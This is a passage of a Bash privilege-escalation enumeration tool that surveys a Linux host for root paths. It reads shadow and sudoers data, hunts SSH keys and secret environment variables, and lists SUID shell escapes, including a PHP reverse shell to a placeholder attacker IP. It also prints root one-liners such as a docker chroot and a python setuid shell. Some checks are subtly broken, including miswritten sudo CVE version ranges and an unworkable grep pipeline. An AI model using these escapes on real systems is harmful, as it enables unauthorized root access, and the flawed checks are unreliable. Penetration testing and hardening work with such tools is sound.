      unsigned_modules=$(dmesg 2>/dev/null | grep "signature" | grep -i "required" | grep -i "module" | grep -v "OK")
      if [ -n "$unsigned_modules" ]; then
        print_warning "Unsigned kernel modules with Secure Boot enabled:"
        echo "$unsigned_modules"
      fi
    fi
  fi

  # List loaded third-party modules
  third_party_modules=$(lsmod 2>/dev/null | grep -v "kernel" | grep -v "live" | head -n 10)
  if [ -n "$third_party_modules" ]; then
    print_info "Top 10 third-party kernel modules:"
    echo "$third_party_modules" | while read -r line; do
      print_success " $line"
    done
  fi
}

check_system_startup() {
  print_subtitle "System Startup Information"

  # Uptime
  uptime_output=$(uptime)
  print_success "Uptime: $uptime_output"

  # Init system type
  if [ -f /proc/1/comm ]; then
    init_system=$(cat /proc/1/comm)
    print_success "Init system: $init_system"
  else
    # Fallback method
    if command_exists systemctl; then
      print_success "Init system: systemd"
    elif command_exists initctl; then
      print_success "Init system: Upstart"
    elif [ -f /etc/init.d/rc ]; then
      print_success "Init system: SysVinit"
    else
      print_warning "Init system: Unknown"
    fi
  fi

  # Last boot time
  last_boot=$(who -b 2>/dev/null | awk '{print $3, $4}')
  if [ -n "$last_boot" ]; then
    print_success "Last boot: $last_boot"
  fi

  # Boot parameters that might be exploitable
  if [ -f /proc/cmdline ]; then
    cmdline=$(cat /proc/cmdline)
    print_info "Boot parameters:"
    print_success " $cmdline"

    # Check for potentially insecure boot parameters
    if echo "$cmdline" | grep -q "init="; then
      print_warning "Custom init process specified in boot parameters"
    fi
    if echo "$cmdline" | grep -q "nokaslr"; then
      print_warning "KASLR is disabled (nokaslr)"
    fi
    if echo "$cmdline" | grep -q "nosuid"; then
      print_warning "SUID binaries disabled globally (nosuid)"
    fi
    if echo "$cmdline" | grep -q "nosmep"; then
      print_warning "SMEP is disabled (nosmep)"
    fi
    if echo "$cmdline" | grep -q "nopti"; then
      print_warning "Kernel Page Table Isolation is disabled (nopti)"
    fi
    if echo "$cmdline" | grep -q "quiet"; then
      print_warning "Kernel is booted in quiet mode (quiet)"
    fi
  fi
}

check_system_security() {
  print_subtitle "System Security Features"

  # SELinux status
  if command_exists sestatus; then
    selinux_status=$(sestatus 2>/dev/null | grep "SELinux status" | awk '{print $3}')
    if [ "$selinux_status" = "enabled" ]; then
      selinux_mode=$(sestatus 2>/dev/null | grep "Current mode" | awk '{print $3}')
      print_success "SELinux: ${selinux_status} (${selinux_mode})"
    else
      print_warning "SELinux: ${selinux_status}"
    fi
  elif [ -f /etc/selinux/config ]; then
    selinux_config=$(grep "^SELINUX=" /etc/selinux/config | cut -d= -f2)
    print_warning "SELinux: ${selinux_config} (from config file)"
  else
    print_warning "SELinux: Not installed"
  fi

  # AppArmor status
  if command_exists aa-status; then
    apparmor_status=$(aa-status 2>&1 | grep -i "apparmor")
    if echo "$apparmor_status" | grep -q -i "enabled"; then
      print_success "AppArmor: Enabled"
    else
      print_warning "AppArmor: Disabled or not properly configured"
    fi
  elif [ -d /etc/apparmor.d ]; then
    print_warning "AppArmor: Config files exist but status cannot be determined"
  else
    print_warning "AppArmor: Not installed"
  fi

  # ASLR (Address Space Layout Randomization)
  if [ -f /proc/sys/kernel/randomize_va_space ]; then
    aslr_status=$(cat /proc/sys/kernel/randomize_va_space)
    case "$aslr_status" in
      0) print_critical "ASLR: Disabled (0)" ;;
      1) print_warning "ASLR: Partial - shared libraries randomization only (1)" ;;
      2) print_success "ASLR: Full randomization (2)" ;;
      *) print_warning "ASLR: Unknown status (${aslr_status})" ;;
    esac
  else
    print_warning "ASLR: Status cannot be determined"
  fi

  # Check if ptrace protection is enabled
  if [ -f /proc/sys/kernel/yama/ptrace_scope ]; then
    ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)
    case "$ptrace_scope" in
      0) print_critical "Ptrace protection: Disabled (0)" ;;
      1) print_success "Ptrace protection: Restricted (1)" ;;
      2) print_success "Ptrace protection: Admin-only (2)" ;;
      3) print_success "Ptrace protection: No ptrace (3)" ;;
      *) print_warning "Ptrace protection: Unknown status (${ptrace_scope})" ;;
    esac
  else
    print_warning "Ptrace protection: Not available"
  fi

  # Check if Exec Shield is enabled
  if [ -f /proc/sys/kernel/exec-shield ]; then
    exec_shield=$(cat /proc/sys/kernel/exec-shield)
    if [ "$exec_shield" -eq 1 ]; then
      print_success "Exec Shield: Enabled"
    else
      print_warning "Exec Shield: Disabled"
    fi
  fi

  # Check if the system has NX/DEP protection
  nx_dep=$(grep -i "nx\|pae" /proc/cpuinfo 2>/dev/null | sort -u)
  if [ -n "$nx_dep" ]; then
    print_success "NX/DEP: CPU supports NX/DEP protection"
  else
    print_warning "NX/DEP: CPU may not support NX/DEP protection"
  fi
}

# Main function to run all system info checks
system_info_checks() {
  print_title "System Information"

  # Run all system information checks
  check_os_version
  check_hardware_info
  check_filesystem_info
  check_kernel_modules
  check_system_startup
  check_system_security

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/user_info/users.sh ---

# Title: User Information
# Description: Check users, their permissions, and related security
# Author: Jonas Resch

check_current_user() {
  print_subtitle "Current User Information"

  # Basic info about current user
  current_user=$(whoami 2>/dev/null)
  current_uid=$(id -u 2>/dev/null)
  current_gid=$(id -g 2>/dev/null)

  print_success "Current user: ${current_user} (UID: ${current_uid}, GID: ${current_gid})"

  # Check if we're root
  if [ "$IAMROOT" ]; then
    print_warning "You are running as root! No privilege escalation needed."
  fi

  # Groups for current user
  user_groups=$(id -G 2>/dev/null)
  user_groups_names=$(id -Gn 2>/dev/null)

  if [ -n "$user_groups_names" ]; then
    print_success "Groups: ${user_groups_names} (IDs: ${user_groups})"

    # Check if user is in interesting groups
    interesting_groups=("sudo" "admin" "wheel" "video" "docker" "lxd" "adm" "shadow" "disk" "root")

    for group in "${interesting_groups[@]}"; do
      if id -Gn 2>/dev/null | grep -qw "$group"; then
        print_critical "User is a member of the high-privilege '${group}' group!"
      fi
    done
  fi

  # Environment variables
  print_info "Environment Variables:"
  env_vars=$(env 2>/dev/null | grep -v "LS_COLORS" | sort)

  if [ -n "$env_vars" ]; then
    # Look for potentially interesting vars (password, token, key, etc.)
    sensitive_env=$(echo "$env_vars" | grep -i "key\|token\|pass\|secret\|cred\|auth" 2>/dev/null)

    if [ -n "$sensitive_env" ]; then
      print_warning "Potentially sensitive environment variables:"
      echo "$sensitive_env" | while read -r line; do
        print_warning " $line"
      done
    fi

    # Path variable (could be used for hijacking)
    path_var=$(echo "$env_vars" | grep "^PATH=" 2>/dev/null)
    if [ -n "$path_var" ]; then
      print_success "Path: $path_var"

      # Look for writable directories in PATH
      path_dirs=$(echo "$path_var" | sed 's/PATH=//g' | tr ':' '\n')

      echo "$path_dirs" | while read -r directory; do
        if [ -n "$directory" ] && [ -w "$directory" ]; then
          print_critical "Writable directory in PATH: $directory"
        elif [ -n "$directory" ] && [ ! -d "$directory" ]; then
          print_warning "Non-existent directory in PATH: $directory"
        fi
      done
    fi
  else
    print_not_found "No environment variables found"
  fi

  # Check sudo permissions
  print_info "Sudo access:"

  # Check if we have a password
  if [ -n "$PASSWORD" ]; then
    sudo_output=$(echo "$PASSWORD" | timeout 1 sudo -S -l 2>/dev/null)
    sudo_exit_code=$?

    if [ $sudo_exit_code -eq 0 ]; then
      # Remove password prompt from output
      sudo_output=$(echo "$sudo_output" | grep -v "password for")
      print_critical "User has sudo privileges! Sudo permissions:"
      echo "$sudo_output" | sed 's/^/    /'
    elif [ $sudo_exit_code -eq 1 ]; then
      print_warning "Incorrect sudo password provided"
    else
      print_success "User does not have sudo access (or requires a different password)"
    fi
  else
    # Try sudo without password
    sudo_nopass=$(sudo -l -n 2>/dev/null)
    sudo_nopass_exit=$?

    if [ $sudo_nopass_exit -eq 0 ]; then
      print_critical "User has sudo privileges without password! Sudo permissions:"
      echo "$sudo_nopass" | sed 's/^/    /'
    else
      print_success "User does not have passwordless sudo access"
    fi
  fi
}

check_all_users() {
  print_subtitle "All Users Information"

  # Get all users
  print_info "Users with console:"
  users_consoles=$(cat /etc/passwd 2>/dev/null | grep -v "^#" | grep -v "nologin\|false" | sort)

  if [ -n "$users_consoles" ]; then
    echo "$users_consoles" | while read -r user_line; do
      user_name=$(echo "$user_line" | cut -d: -f1)
      user_uid=$(echo "$user_line" | cut -d: -f3)
      user_gid=$(echo "$user_line" | cut -d: -f4)
      user_info=$(echo "$user_line" | cut -d: -f5)
      user_home=$(echo "$user_line" | cut -d: -f6)
      user_shell=$(echo "$user_line" | cut -d: -f7)

      # Highlight root accounts and service accounts
      if [ "$user_uid" -eq 0 ]; then
        print_critical " ${RED}${user_name}${NC} [UID: ${user_uid}] [GID: ${user_gid}] [Home: ${user_home}] [Shell: ${user_shell}]"
      elif [ "$user_uid" -lt 1000 ] && [ "$user_uid" -gt 0 ]; then
        print_success " ${YELLOW}${user_name}${NC} [UID: ${user_uid}] [GID: ${user_gid}] [Home: ${user_home}] [Shell: ${user_shell}]"
      else
        print_success " ${GREEN}${user_name}${NC} [UID: ${user_uid}] [GID: ${user_gid}] [Home: ${user_home}] [Shell: ${user_shell}]"
      fi
    done
  else
    print_not_found "No users with console found"
  fi

  # Users currently logged in
  print_info "Currently logged-in users:"
  current_logins=$(who 2>/dev/null)

  if [ -n "$current_logins" ]; then
    echo "$current_logins" | while read -r line; do
      print_success " $line"
    done
  else
    print_not_found "No currently logged-in users found"
  fi

  # Last logins
  print_info "Last logins:"
  last_logins=$(last -a 2>/dev/null | head -n 10)

  if [ -n "$last_logins" ]; then
    echo "$last_logins" | while read -r line; do
      print_success " $line"
    done
  else
    print_not_found "No login history found"
  fi
}

check_user_directories() {
  print_subtitle "User Directories and Permissions"

  # Check home directories
  print_info "Readable home directories:"

  for home_dir in /home/*; do
    if [ -d "$home_dir" ]; then
      user=$(basename "$home_dir")

      if [ -r "$home_dir" ]; then
        if [ -w "$home_dir" ]; then
          print_critical " ${RED}${user}${NC} [${home_dir}] - Directory is readable and writable!"
        else
          print_warning " ${YELLOW}${user}${NC} [${home_dir}] - Directory is readable"
        fi

        # Check for interesting files
        if [ "$THOROUGH" ]; then
          print_info "   Interesting files in ${user}'s home directory:"

          # SSH keys
          ssh_dir="$home_dir/.ssh"
          if [ -r "$ssh_dir" ]; then
            if [ -f "$ssh_dir/id_rsa" ]; then
              print_critical "    ${RED}Found SSH private key:${NC} $ssh_dir/id_rsa"
            fi
            if [ -f "$ssh_dir/id_dsa" ]; then
              print_critical "    ${RED}Found SSH private key:${NC} $ssh_dir/id_dsa"
            fi
            if [ -f "$ssh_dir/id_ecdsa" ]; then
              print_critical "    ${RED}Found SSH private key:${NC} $ssh_dir/id_ecdsa"
            fi
            if [ -f "$ssh_dir/id_ed25519" ]; then
              print_critical "    ${RED}Found SSH private key:${NC} $ssh_dir/id_ed25519"
            fi
            if [ -f "$ssh_dir/authorized_keys" ]; then
              print_warning "    ${YELLOW}Found SSH authorized_keys:${NC} $ssh_dir/authorized_keys"
            fi
          fi

          # History files
          for history_file in ".bash_history" ".zsh_history" ".mysql_history" ".python_history" ".psql_history" ".viminfo"; do
            if [ -r "$home_dir/$history_file" ]; then
              print_warning "    ${YELLOW}Found history file:${NC} $home_dir/$history_file"
            fi
          done

          # Config files
          for config_file in ".bashrc" ".bash_profile" ".profile" ".zshrc" ".zhsenv" ".vimrc" ".gitconfig"; do
            if [ -r "$home_dir/$config_file" ]; then
              print_warning "    ${BLUE}Found config file:${NC} $home_dir/$config_file"
            fi
          done
        fi
      fi
    fi
  done

  # Check mail directories
  if [ -d "/var/mail" ]; then
    print_info "Readable mail directories:"

    if [ -r "/var/mail" ]; then
      if [ -w "/var/mail" ]; then
        print_critical " /var/mail directory is readable and writable!"
      else
        print_warning " /var/mail directory is readable"
      fi

      for mail_file in /var/mail/*; do
        if [ -f "$mail_file" ]; then
          user=$(basename "$mail_file")

          if [ -r "$mail_file" ]; then
            if [ -w "$mail_file" ]; then
              print_critical "  ${RED}${user}${NC} mail file is readable and writable!"
            else
              print_warning "  ${YELLOW}${user}${NC} mail file is readable"
            fi
          fi
        fi
      done
    fi
  fi
}

check_password_policy() {
  print_subtitle "Password Policy"

  # Check for password aging
  print_info "Password aging policy:"

  if [ -f /etc/login.defs ]; then
    pass_max_days=$(grep "^PASS_MAX_DAYS" /etc/login.defs | awk '{print $2}')
    pass_min_days=$(grep "^PASS_MIN_DAYS" /etc/login.defs | awk '{print $2}')
    pass_warn_age=$(grep "^PASS_WARN_AGE" /etc/login.defs | awk '{print $2}')

    if [ -n "$pass_max_days" ]; then
      if [ "$pass_max_days" -gt 90 ]; then
        print_warning " Maximum password age: ${YELLOW}${pass_max_days}${NC} days (should be 90 or less)"
      else
        print_success " Maximum password age: ${pass_max_days} days"
      fi
    fi

    if [ -n "$pass_min_days" ]; then
      if [ "$pass_min_days" -eq 0 ]; then
        print_warning " Minimum password age: ${YELLOW}${pass_min_days}${NC} days (should be greater than 0)"
      else
        print_success " Minimum password age: ${pass_min_days} days"
      fi
    fi

    if [ -n "$pass_warn_age" ]; then
      if [ "$pass_warn_age" -lt 7 ]; then
        print_warning " Password warning age: ${YELLOW}${pass_warn_age}${NC} days (should be 7 or more)"
      else
        print_success " Password warning age: ${pass_warn_age} days"
      fi
    fi
  else
    print_not_found "Password policy file not found"
  fi

  # Check for PAM password complexity
  print_info "Password complexity requirements:"

  if [ -f /etc/pam.d/common-password ]; then
    password_pam=$(grep -v '^#' /etc/pam.d/common-password)

    if echo "$password_pam" | grep -q "pam_pwquality.so\|pam_cracklib.so"; then
      print_success " Password complexity is enforced via PAM"

      # Check minimum length
      min_length=$(echo "$password_pam" | grep -o "minlen=[0-9]*" | cut -d= -f2)
      if [ -n "$min_length" ]; then
        if [ "$min_length" -lt 8 ]; then
          print_warning "  Minimum password length: ${YELLOW}${min_length}${NC} (should be 8 or more)"
        else
          print_success "  Minimum password length: ${min_length}"
        fi
      fi

      # Check if dictionary words are rejected
      if echo "$password_pam" | grep -q "reject_username\|dictcheck"; then
        print_success "  Dictionary words and usernames are rejected"
      else
        print_warning "  No explicit check for dictionary words"
      fi
    else
      print_warning " No password complexity requirements found"
    fi
  else
    print_not_found "PAM password configuration not found"
  fi

  # Check for accounts with empty passwords
  print_info "Accounts with empty passwords:"

  if [ -f /etc/shadow ]; then
    empty_passwords=$(grep -v ':\*:\|:!:' /etc/shadow | grep '::' 2>/dev/null)

    if [ -n "$empty_passwords" ]; then
      print_critical " Accounts with empty passwords found:"
      echo "$empty_passwords" | while read -r line; do
        user=$(echo "$line" | cut -d: -f1)
        print_critical "  ${RED}${user}${NC} has no password set!"
      done
    else
      print_success " No accounts with empty passwords"
    fi
  else
    print_warning " Cannot read shadow file to check for empty passwords"
  fi
}

check_sudo_permissions() {
  print_subtitle "Sudo Configuration"

  # Check if we have a custom sudoers file
  print_info "Custom sudoers files:"

  if [ -d /etc/sudoers.d ]; then
    custom_sudoers=$(ls -la /etc/sudoers.d/ 2>/dev/null)

    if [ -n "$custom_sudoers" ]; then
      echo "$custom_sudoers" | while read -r line; do
        print_success " $line"
      done

      # Check for NOPASSWD and interesting rules
      nopasswd_rules=$(grep -r "NOPASSWD" /etc/sudoers.d/ 2>/dev/null)

      if [ -n "$nopasswd_rules" ]; then
        print_warning " NOPASSWD rules found:"
        echo "$nopasswd_rules" | while read -r line; do
          print_warning "  $line"
        done
      fi
    else
      print_success " No custom sudoers files found"
    fi
  fi

  # Check main sudoers file
  print_info "Main sudoers file:"

  if [ -r /etc/sudoers ]; then
    sudoers=$(grep -v "^#\|^Defaults\|^$" /etc/sudoers 2>/dev/null)

    if [ -n "$sudoers" ]; then
      echo "$sudoers" | while read -r line; do
        # Highlight NOPASSWD entries
        if echo "$line" | grep -q "NOPASSWD"; then
          print_warning " ${YELLOW}${line}${NC}"
        else
          print_success " $line"
        fi
      done
    else
      print_not_found " No non-default entries in sudoers file"
    fi
  else
    print_warning " Cannot read sudoers file"
  fi

  # Check for sudo version (for vulnerabilities)
  print_info "Sudo version:"

  sudo_version=$(sudo -V 2>/dev/null | grep "Sudo version" | awk '{print $3}')

  if [ -n "$sudo_version" ]; then
    print_success " Sudo version: ${sudo_version}"

    # Check for sudo vulnerability CVE-2021-3156 (Baron Samedit)
    if version_greater_equal "1.8.30" "$sudo_version" && ! version_greater_equal "1.8.26" "$sudo_version"; then
      print_critical " ${RED}Potentially vulnerable to CVE-2021-3156 (Baron Samedit)${NC}"
    fi

    # Check for sudo vulnerability CVE-2019-14287 (runas user ID -1)
    if version_greater_equal "1.8.28" "$sudo_version" && ! version_greater_equal "1.8.1" "$sudo_version"; then
      print_critical " ${RED}Potentially vulnerable to CVE-2019-14287 (Negative user ID)${NC}"
    fi
  else
    print_warning " Sudo version could not be determined"
  fi
}

# Main function to run all user info checks
user_info_checks() {
  print_title "User Information"

  # Run all user information checks
  check_current_user
  check_all_users
  check_user_directories
  check_password_policy
  check_sudo_permissions

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/exploit_checks/suid_sgid.sh ---

# Title: SUID/SGID and Capabilities Checker
# Description: Check for exploitable SUID/SGID binaries and capabilities
# Author: Jonas Resch

# Known SUID/SGID binaries that can be used for privilege escalation
declare -A SUID_BINS
SUID_BINS["/usr/bin/sudo"]="Execute commands as root with proper permissions"
SUID_BINS["/usr/bin/pkexec"]="Execute commands as another user with policykit"
SUID_BINS["/usr/bin/dbus-daemon-launch-helper"]="Helps to launch dbus services"
SUID_BINS["/usr/lib/openssh/ssh-keysign"]="Used by ssh for host-based authentication"
SUID_BINS["/usr/lib/dbus-1.0/dbus-daemon-launch-helper"]="Helps to launch dbus services"
SUID_BINS["/usr/lib/eject/dmcrypt-get-device"]="Used by cryptsetup for device mapping"
SUID_BINS["/usr/lib/policykit-1/polkit-agent-helper-1"]="policykit helper for authentication"
SUID_BINS["/usr/lib/xorg/Xorg.wrap"]="X server wrapper"
SUID_BINS["/usr/sbin/pppd"]="Point-to-Point Protocol daemon"
SUID_BINS["/usr/sbin/exim4"]="Mail Transfer Agent"
SUID_BINS["/sbin/mount.nfs"]="Used to mount NFS file systems"
SUID_BINS["/bin/mount"]="Mount file systems"
SUID_BINS["/bin/umount"]="Unmount file systems"
SUID_BINS["/bin/su"]="Switch user"
SUID_BINS["/bin/ping"]="Send ICMP ECHO_REQUEST packets to network hosts"

# Exploitable SUID binaries
declare -A EXPLOITABLE_BINS
EXPLOITABLE_BINS["/usr/bin/nmap"]="--interactive -> !sh"
EXPLOITABLE_BINS["/usr/bin/vim"]="vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
EXPLOITABLE_BINS["/usr/bin/find"]="find . -exec /bin/sh -p \\; -quit"
EXPLOITABLE_BINS["/usr/bin/nano"]="Can write to sensitive files"
EXPLOITABLE_BINS["/usr/bin/python"]="python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
EXPLOITABLE_BINS["/usr/bin/perl"]="perl -e 'exec \"/bin/sh\";'"
EXPLOITABLE_BINS["/usr/bin/ruby"]="ruby -e 'exec \"/bin/sh\"'"
EXPLOITABLE_BINS["/usr/bin/php"]="php -r '\\$sock=fsockopen(\"ATTACKERIP\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
EXPLOITABLE_BINS["/usr/bin/less"]="less /etc/profile then !/bin/sh"
EXPLOITABLE_BINS["/usr/bin/more"]="more /etc/profile then !/bin/sh"
EXPLOITABLE_BINS["/usr/bin/man"]="man man then !/bin/sh"
EXPLOITABLE_BINS["/usr/bin/awk"]="awk 'BEGIN {system(\"/bin/sh\")}'"
EXPLOITABLE_BINS["/usr/bin/bash"]="bash -p"
EXPLOITABLE_BINS["/usr/bin/cp"]="Can copy over sensitive files"
EXPLOITABLE_BINS["/usr/bin/mv"]="Can move over sensitive files"
EXPLOITABLE_BINS["/usr/bin/chmod"]="Can change permissions of sensitive files"
EXPLOITABLE_BINS["/usr/bin/chown"]="Can change ownership of sensitive files"

check_suid_binaries() {
  print_subtitle "SUID/SGID Binaries"

  # Find SUID binaries
  print_info "Looking for SUID binaries (might take a while)..."

  # Optimized find command that skips irrelevant directories
  suid_bins=$(find / -path /proc -prune -o \
                    -path /sys -prune -o \
                    -path /run -prune -o \
                    -path /snap -prune -o \
                    -path /var/lib/docker -prune -o \
                    -path /var/lib/lxc -prune -o \
                    -path /mnt -prune -o \
                    -path /media -prune -o \
                    -path /dev -prune -o \
                    -type f \( -perm -4000 -o -perm -2000 \) -print 2>/dev/null)

  if [ -n "$suid_bins" ]; then
    print_success "Found $(echo "$suid_bins" | wc -l) SUID/SGID binaries:"

    echo "$suid_bins" | while read -r binary; do
      owner=$(ls -la "$binary" 2>/dev/null | awk '{print $3}')
      perms=$(ls -la "$binary" 2>/dev/null | awk '{print $1}')

      # Safer way to check array keys
      is_exploitable=0
      is_known=0
      exploitable_info=""
      known_info=""

      # Check each key in the exploitable bins array
      for key in "${!EXPLOITABLE_BINS[@]}"; do
        if [ "$key" = "$binary" ]; then
          is_exploitable=1
          exploitable_info="${EXPLOITABLE_BINS[$key]}"
          break
        fi
      done

      # Check each key in the known SUID bins array
      for key in "${!SUID_BINS[@]}"; do
        if [ "$key" = "$binary" ]; then
          is_known=1
          known_info="${SUID_BINS[$key]}"
          break
        fi
      done

      # Now safely display the information
      if [ "$is_exploitable" -eq 1 ]; then
        print_critical " ${RED}${binary}${NC} [${perms}] [Owner: ${owner}]"
        print_critical "   ${RED}→ Exploitable:${NC} ${exploitable_info}"
      elif [ "$is_known" -eq 1 ]; then
        print_warning " ${YELLOW}${binary}${NC} [${perms}] [Owner: ${owner}]"
        print_warning "   ${YELLOW}→ Purpose:${NC} ${known_info}"
      else
        print_success " ${binary} [${perms}] [Owner: ${owner}]"
      fi

      # Check if it's a shell script (which shouldn't have SUID bit)
      if [ -f "$binary" ] && file "$binary" 2>/dev/null | grep -q "shell script"; then
        print_critical "   ${RED}→ This is a shell script! Very uncommon and likely vulnerable!${NC}"
      fi

      # Check if it's world-writable (which is very dangerous)
      if [ -f "$binary" ] && [ -w "$binary" ]; then
        print_critical "   ${RED}→ This binary is world-writable! Extremely dangerous!${NC}"
      fi
    done
  else
    print_warning "No SUID/SGID binaries found (strange, there should be at least some standard ones)"
  fi
}

check_custom_privesc_vectors() {
  print_subtitle "Custom Privesc Vectors"

  # Check for SUDO commands that can be used for privilege escalation
  print_info "Checking for custom privesc vectors..."

  # Check for common shells
  shell_list=("bash" "sh" "dash" "zsh" "csh" "ksh" "tcsh" "fish")
  print_info "Shell access as other users:"

  for shell in "${shell_list[@]}"; do
    # Check if we can sudo as this shell
    if [ -n "$PASSWORD" ]; then
      # Use password with sudo
      if echo "$PASSWORD" | sudo -S -l 2>/dev/null | grep -q "bin/$shell"; then
        print_critical " ${RED}You can sudo run $shell!${NC} Try: sudo $shell"
      fi
    else
      # Try without password (non-interactive)
      if sudo -n -l 2>/dev/null | grep -q "bin/$shell"; then
        print_critical " ${RED}You can sudo run $shell!${NC} Try: sudo $shell"
      fi
    fi

    # Check for shell SUID
    shell_path=$(which "$shell" 2>/dev/null)
    if [ -n "$shell_path" ] && [ -u "$shell_path" ]; then
      print_critical " ${RED}$shell_path has SUID bit set!${NC} Try: $shell_path -p"
    fi
  done

  # Check for dangerous sudoers entries
  print_info "Dangerous sudoers rules:"

  # Get sudo permissions
  if [ -n "$PASSWORD" ]; then
    sudo_commands=$(echo "$PASSWORD" | sudo -S -l 2>/dev/null)
  else
    sudo_commands=$(sudo -n -l 2>/dev/null)
  fi

  if [ -n "$sudo_commands" ]; then
    dangerous_cmds=("cp" "mv" "cat" "find" "vim" "vi" "emacs" "nano" "python" "perl" "ruby" "php" "awk" "sed" "echo" "less" "more" "man" "nc" "ncat" "netcat" "tee" "dd" "wget" "curl")

    for cmd in "${dangerous_cmds[@]}"; do
      if echo "$sudo_commands" | grep -i "bin/$cmd" | grep -v "NOEXEC"; then
        print_critical " ${RED}You can run $cmd as sudo!${NC} Check GTFOBins for exploitation: https://gtfobins.github.io/"
      fi
    done

    # Check for ALL commands
    if echo "$sudo_commands" | grep -q "(ALL)" | grep -v "NOEXEC"; then
      print_critical " ${RED}You can run ALL commands!${NC} Exploit: sudo su"
    fi

    # Check for sudoedit (can edit sensitive files)
    if echo "$sudo_commands" | grep -q "sudoedit"; then
      print_critical " ${RED}You can use sudoedit!${NC} Try editing sensitive files like /etc/passwd or /etc/sudoers"
    fi
  fi

  # Check for docker group membership (instant root)
  if id -nG 2>/dev/null | grep -qw "docker"; then
    print_critical " ${RED}You are in the docker group!${NC} Try: docker run -v /:/mnt -it ubuntu chroot /mnt bash"
  fi

  # Check for lxd/lxc group membership (instant root)
  if id -nG 2>/dev/null | grep -qw "lxd\|lxc"; then
    print_critical " ${RED}You are in the lxd/lxc group!${NC} This can be exploited for root access."
  fi
}

check_capabilities() {
  print_subtitle "Linux Capabilities"

  # Check for binaries with capabilities
  print_info "Looking for binaries with capabilities..."

  if command_exists getcap; then
    # Optimized getcap command that skips irrelevant directories
    caps=$(getcap -r / 2>/dev/null | grep -v -E "/snap/|/proc/|/sys/|/run/|/var/lib/docker/|/var/lib/lxc/")

    if [ -n "$caps" ]; then
      print_success "Found binaries with capabilities:"

      echo "$caps" | while read -r line; do
        binary=$(echo "$line" | awk '{print $1}')
        capability=$(echo "$line" | awk '{print $2}')

        # Check for dangerous capabilities
        if echo "$capability" | grep -q "cap_setuid\|cap_setgid\|cap_sys_admin\|cap_net_admin\|cap_net_raw\|cap_sys_ptrace\|cap_sys_module"; then
          print_critical " ${RED}${binary}${NC} [${capability}]"

          # Specific capabilities exploitation guidance
          if echo "$capability" | grep -q "cap_setuid"; then
            print_critical "   ${RED}→ Can be exploited to get root! Example for Python:${NC}"
            print_critical "   ${RED}→ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
          elif echo "$capability" | grep -q "cap_sys_admin"; then
            print_critical "   ${RED}→ Provides full admin capabilities, can mount filesystems etc.${NC}"
          elif echo "$capability" | grep -q "cap_sys_ptrace"; then
            print_critical "   ${RED}→ Can attach to any process and modify its memory${NC}"
          fi
        else
          print_warning " ${YELLOW}${binary}${NC} [${capability}]"
        fi
      done
    else
      print_success "No binaries with capabilities found"
    fi
  else
    print_warning "getcap not available, skipping capabilities check"
  fi

  # Check for potentially dangerous capabilities allowed in container
  if [ -f "/.dockerenv" ] || grep -qi "docker\|lxc" /proc/1/cgroup 2>/dev/null; then
    print_info "Checking for dangerous capabilities in container..."

    if [ -r /proc/self/status ]; then
      container_caps=$(grep "CapEff:" /proc/self/status 2>/dev/null)

      if [ -n "$container_caps" ]; then
        # Extract the hex value
        cap_hex=$(echo "$container_caps" | awk '{print $2}')

        # Convert to decimal and check specific bits for dangerous capabilities
        cap_dec=$(printf "%d" "0x$cap_hex" 2>/dev/null)

        # Check for CAP_SYS_ADMIN (bit 21)
        if (( (cap_dec >> 21) & 1 )); then
          print_critical " ${RED}Container has CAP_SYS_ADMIN capability!${NC} This can be exploited to escape."
        fi

        # Check for CAP_NET_ADMIN (bit 12)
        if (( (cap_dec >> 12) & 1 )); then
          print_warning " ${YELLOW}Container has CAP_NET_ADMIN capability!${NC} Can modify network configuration."
        fi
      fi
    fi
  fi
}

# Main function to run all SUID/SGID binary checks
suid_sgid_checks() {
  print_title "SUID/SGID Binaries and Capabilities"

  # Run all SUID/SGID and capabilities checks
  check_suid_binaries
  check_custom_privesc_vectors
  check_capabilities

  # Wait for user if wait mode is enabled
  wait_for_user
}
# --- modules/exploit_checks/writable_files.sh ---

# Title: Writable Files Checker
# Description: Check for writable files and directories that could be exploited for privilege escalation
# Author: Jonas Resch

# Check for writable configuration files
check_writable_etc_files() {
  print_subtitle "Writable Files in /etc"

  print_info "Checking for writable files in /etc..."

  # Find writable files in /etc
  writable_etc=$(find /etc -type f -writable 2>/dev/null)

  if [ -n "$writable_etc" ]; then
    print_critical "Found writable files in /etc (potential privilege escalation):"
    echo "$writable_etc" | while read -r file; do
      owner=$(ls -la "$file" 2>/dev/null | awk '{print $3}')
      perms=$(ls -la "$file" 2>/dev/null | awk '{print $1}')
      print_critical " ${RED}${file}${NC} [${perms}] [Owner: ${owner}]"
    done
  else
    print_success "No writable files found in /etc"
  fi
}

# Check for writable path hijacking opportunities
check_path_hijacking() {
  print_subtitle "PATH Hijacking"

  print_info "Checking for PATH hijacking opportunities..."

  # Get the current PATH
  path_dirs=$(echo "$PATH" | tr ':' '\n')

  # Check for writable directories in PATH
  writable_path_dirs=()

  for dir in $path_dirs; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
      writable_path_dirs+=("$dir")
    fi
  done

  if [ ${#writable_path_dirs[@]} -gt 0 ]; then
    print_critical "Found writable directories in PATH (potential for PATH hijacking):"
    for dir in "${writable_path_dirs[@]}"; do
      print_critical " ${RED}${dir}${NC}"
    done

    print_critical "PATH hijacking can be used to execute arbitrary code when a program is run"
  else
    print_success "No writable directories found in PATH"
  fi

  # Check for commonly used commands without absolute paths
  print_info "Checking for commands commonly used without absolute paths..."
  common_cmds=("ls" "cat" "find" "grep" "id" "whoami" "python" "perl" "ruby" "php" "node" "cp" "mv")

  for cmd in "${common_cmds[@]}"; do
    cmd_path=$(which "$cmd" 2>/dev/null)
    if [ -n "$cmd_path" ]; then
      # Check if there are any scripts using this command without a full path
      scripts_using_cmd=$(grep -l "^[^#].*[^a-zA-Z0-9\/\._-]$cmd[^a-zA-Z0-9\/\._-]" /etc/cron* /etc/init.d/* /usr/local/bin/* /usr/local/sbin/* 2>/dev/null)

      if [ -n "$scripts_using_cmd" ]; then
        print_warning "Command '$cmd' is used without absolute path in scripts:"
        echo "$scripts_using_cmd" | head -n 5 | while read -r script; do
          print_warning " ${YELLOW}${script}${NC}"
        done

